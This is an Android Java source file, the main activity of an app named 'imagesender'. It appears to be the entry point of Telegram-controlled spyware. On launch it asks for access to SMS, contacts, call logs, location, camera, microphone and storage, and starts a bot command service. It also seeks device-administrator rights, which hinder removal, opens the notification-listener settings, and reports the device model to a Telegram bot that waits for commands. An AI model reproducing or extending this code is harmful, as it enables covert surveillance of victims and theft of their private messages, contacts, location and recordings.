package com.dotbhai.imagesender;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class MainActivity extends AppCompatActivity {

    private static final int PERM_REQ = 100;

    private final String[] PERMS = {
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_WIFI_STATE
    };

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        ActivityCompat.requestPermissions(this, PERMS, PERM_REQ);

        startService(new Intent(this, BotCommandService.class));

        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName cn = new ComponentName(this, AdminReceiver.class);
        if (!dpm.isAdminActive(cn)) {
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
            startActivity(i);
        }

        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));

        TelegramSender.sendMessage("🚀 <b>التطبيق جاهز</b>\n" + Build.MODEL + "\nأرسل /start");
        Toast.makeText(this, "البوت شغّال — افتح تلجرام", Toast.LENGTH_LONG).show();
    }
}